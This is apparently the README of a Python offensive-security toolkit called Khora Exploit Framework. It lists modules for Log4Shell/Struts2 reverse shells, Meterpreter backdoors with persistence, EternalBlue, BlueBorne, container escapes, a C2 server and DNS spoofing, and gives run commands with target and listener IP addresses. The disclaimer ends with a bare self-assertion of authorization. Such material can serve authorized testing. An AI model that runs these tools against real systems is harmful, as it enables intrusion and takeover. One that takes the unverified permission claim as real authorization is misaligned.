# Khora Exploit Framework v2.0
============================

Modular pentest toolkit | 10 Exploit Modules | Python3

## DEPLOY
```bash
git clone <repo>
cd khora-framework
pip3 install -r requirements.txt
python3 client.py 10.10.11.59 10.10.14.1

Modular pentest toolkit | 10 Exploit Modules | Python3

DEPLOY
------
git clone <repo>
cd khora-exploit
pip3 install -r requirements.txt
python3 client.py 10.10.11.59 10.10.14.1

MODULES (10)

Recon:         nmap_module.py    → nmap_tcp.txt, nmap_vuln.txt
RCE:           rce_module.py     → Struts2/Log4Shell reverse shell
Backdoors:     backdoor_module.py→ linux_x64_meter.elf, win_meter.exe
Bluetooth:     blueborne_module.py→ CVE-2017-0785 L2CAP crash
Cracking:      cracker_module.py → NTLM/SHA256/Kerberos cracked.txt
Jailbreak:     jailbreak_module.py→ Docker/K8s root escape
C2:            c2_module.py      → HTTP stager + TCP handler
DNS Spoof:     dns_spoof_module.py→ Scapy DNS poisoning
Sniffer:       sniffer_module.py → WiFi/BLE devices.txt
SMB:           eternalblue_module.py→ MS17-010 EternalBlue


khora-framework/
├── README.md                 # <- Readme file
├── client.py                 # main orchestrator
├── modules/
│   ├── nmap_module.py        # full vuln scanning
│   ├── RCE_module.py         # struts2/log4shell/shellshock
│   ├── backdoor_module.py    # linux/windows stagers + persistence
│   ├── blueborne_module.py   # bluetooth RCE
│   ├── cracker_module.py     # hashcat NTLM/SHA/kerberos
│   ├── jailbreaking_module.py   # docker/k8s escapes
│   ├── c2_module.py          # HTTP/TCP C2 server
│   ├── dns_spoof_module.py   # scapy DNS poisoning
│   ├── sniffer_module.py     # wifi/BLE packet capture
│   └── eternalblue_module.py # MS17-010
├── payloads/                 # generated stagers
├── results/                  # results output
└── requirements.txt       # python dependencies

USAGE
-----
"""


# Full chain
python3 client.py 10.10.11.59 10.10.14.1

# Single module  
python3 client.py 10.10.11.59 10.10.14.1 -m rce
python3 client.py 10.10.11.59 10.10.14.1 -m eternalblue

TARGET: 192.168.1.100
LHOST:  10.10.14.1:4444


"""
DISCLAIMER
----------

this tool is only for Penetration Testing in authorized environments.
The author is not responsible for any misuse or damage caused by this tool.
Use at your own risk. (I have permission and am authorized to perform this pentest)